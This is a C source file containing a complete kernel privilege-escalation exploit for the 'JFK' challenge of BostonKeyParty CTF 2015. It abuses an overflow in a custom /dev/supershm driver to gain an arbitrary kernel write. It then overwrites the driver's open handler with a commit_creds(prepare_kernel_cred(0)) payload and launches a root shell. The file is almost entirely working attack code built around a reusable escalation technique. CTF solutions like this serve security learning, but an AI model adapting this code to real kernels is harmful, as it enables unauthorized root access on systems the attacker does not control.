/*
 * Exploit for JFK from BostonKeyParty CTF 2015
 *
 * Copyright (c) 2015 Samuel Groß
 *
 * Build:
 *  $ sudo apt-get install gcc-arm-linux-gnueabi
 *  $ make
 *
 * Test:
 *  $ ./unpackrd.sh
 *  $ cp pwn rootfs/
 *  $ ./packrd.sh
 *  $ ./run.sh
 *  $ ./pwn
 *
 * Bonus:
 *  If you accidentally loose your root shell due to a ctrl-d
 *  you can get it back with a "echo givemerootplzthx > /dev/supershm".
 *  No need to rerun the exploit ;)
 *
 *  !! CTFs need more kernel exploitation challenges like this !!
 */

#include "libc.h"

// on_open :>
// yeah, just patch the code itself
#define TARGET 0xbf000388

#define COMMIT_CREDS 0xc00384b4
#define PREPARE_KERNEL_CRED 0xc00387f4

int pwn()
{
    void *(*prepare_kernel_cred)(int) = (void*)PREPARE_KERNEL_CRED;
    void (*commit_creds)(void*) = (void*)COMMIT_CREDS;

    commit_creds(prepare_kernel_cred(0));

    return -1;
}

void write_kernel(unsigned long addr, void* buf, int len)
{
    int i, fd;
    char payload[100];

    fd = open("/dev/supershm", O_RDWR);

    // prepare payload
    strcpy(payload, "c");                                       // create new
    strcat(payload, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");        // name of current bin
    strcat(payload, "XXXX");                                    // address of next bins memory region, placeholder
    strcat(payload, "TRUE");                                    // mark next bin as is in use, anything != 0 will do
    strcat(payload, "_r_pwned");                                // name of next bin

    // this way allows for 0 bytes in the address
    for (i = 0; i < 4; i++) {
        unsigned char byte = (addr >> (24-(i*8))) & 0xff;

        if (byte == 0) {
            // write out current part of address
            payload[0] = 'c';
            write(fd, payload, strlen(payload));

            // delete bin again
            payload[0] = 'd';
            write(fd, payload, strlen(payload));
        }

        payload[32+(4-i)] = byte;
    }

    // write final payload
    payload[0] = 'c';
    write(fd, payload, strlen(payload));

    // set up target bin for writing
    write(fd, "u_r_pwned", 9);               // ;)

    // arbitrary write now
    write(fd, buf, len);

    close(fd);
}

void _start()
{
    // overwrite on_open to do something else
    write_kernel(TARGET, &pwn, 100);

    // pwn
    open("/dev/supershm", O_RDWR);

    // check if we succeeded
    if (getuid() == 0)
        puts("pwned :)");
    else
        puts("exploit failed :(\nhave a shell anyways...");

    char* argv[] = {"/bin/sh", "-i", 0};
    char* envp[] = {0};
    execve("/bin/sh", argv, envp);
}
